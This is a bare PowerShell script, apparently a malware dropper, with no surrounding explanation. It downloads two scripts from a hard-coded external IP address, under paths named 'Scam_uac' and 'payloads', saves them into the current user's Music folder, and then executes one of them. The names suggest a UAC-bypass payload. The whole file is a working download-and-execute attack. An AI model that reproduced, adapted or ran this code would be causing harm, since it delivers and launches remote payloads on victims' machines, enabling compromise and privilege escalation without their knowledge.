
$down = New-Object System.Net.WebClient
$url  = 'http://54.208.157.120:80/Scam_uac/Uac_main.ps1'
$file = "c:\Users\$env:USERNAME\Music\Uac_main.ps1"
$down.DownloadFile($url, $file);

$down = New-Object System.Net.WebClient
$url  = 'http://54.208.157.120:80/Scam_uac/payloads/efq68mtn.ps1'
$file = "c:\Users\$env:USERNAME\Music\efq68mtn.ps1"
$down.DownloadFile($url, $file);

powershell c:\Users\$env:USERNAME\Music\Uac_main.ps1
    